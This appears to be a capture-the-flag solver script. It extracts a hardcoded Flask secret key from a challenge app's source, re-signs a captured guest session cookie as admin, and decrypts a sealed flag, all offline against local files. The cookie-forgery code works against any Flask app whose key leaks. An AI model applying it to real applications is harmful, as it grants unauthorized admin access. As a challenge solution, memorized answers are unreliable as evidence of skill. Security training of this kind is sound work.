#!/usr/bin/env python3
"""Re-sign the Flask session as admin and unseal the flag -- fully offline."""

import hashlib
import os
import re

from flask import Flask
from flask.sessions import SecureCookieSessionInterface

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)


def leaked_key() -> str:
    src = open(os.path.join(ROOT, "app.py")).read()
    return re.search(r'app\.secret_key = "([^"]+)"', src).group(1)


def sealed_hex() -> str:
    src = open(os.path.join(ROOT, "app.py")).read()
    parts = re.findall(r'"([0-9a-f]+)"', src)
    return "".join(p for p in parts if p and all(c in "0123456789abcdef" for c in p))


def serializer(key: str):
    app = Flask(__name__)
    app.secret_key = key
    return SecureCookieSessionInterface().get_signing_serializer(app)


def keystream(key: bytes, n: int) -> bytes:
    out = b""
    counter = 0
    while len(out) < n:
        out += hashlib.sha256(key + counter.to_bytes(4, "big")).digest()
        counter += 1
    return out[:n]


def main() -> None:
    key = leaked_key()
    s = serializer(key)

    captured = open(os.path.join(ROOT, "session_cookie.txt")).read().strip()
    data = s.loads(captured)
    assert data["role"] == "guest"

    # forge admin session (this is what /admin/flag would accept)
    data["role"] = "admin"
    forged = s.dumps(data)
    assert s.loads(forged)["role"] == "admin"

    ct = bytes.fromhex(sealed_hex())
    kk = hashlib.sha256(key.encode() + b"|panel-seal").digest()
    flag = bytes(a ^ b for a, b in zip(ct, keystream(kk, len(ct)))).decode()
    print(flag)


if __name__ == "__main__":
    main()
